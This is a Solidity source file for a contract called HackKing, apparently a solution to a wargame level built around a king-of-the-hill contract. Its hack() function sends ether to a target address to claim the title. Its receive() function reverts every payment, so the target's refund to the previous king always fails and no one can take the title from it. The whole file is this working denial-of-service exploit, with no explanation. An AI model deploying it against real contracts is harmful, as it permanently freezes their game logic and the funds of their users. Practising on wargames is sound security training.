// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract HackKing {

    receive() external payable {
        revert("This contract does not accept payments");
    }

    function hack(address payable _addr) public payable {
        (bool sent, ) = address(_addr).call.value(msg.value)("");
        require(sent, "Failed to send value!");
    }

}
